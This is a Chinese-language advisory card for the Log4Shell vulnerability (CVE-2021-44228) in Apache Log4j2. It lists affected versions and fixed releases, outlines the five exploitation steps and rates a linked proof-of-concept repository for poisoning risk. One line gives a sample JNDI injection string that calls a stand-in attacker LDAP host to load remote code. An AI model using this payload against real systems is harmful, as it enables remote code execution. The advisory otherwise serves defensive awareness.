## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)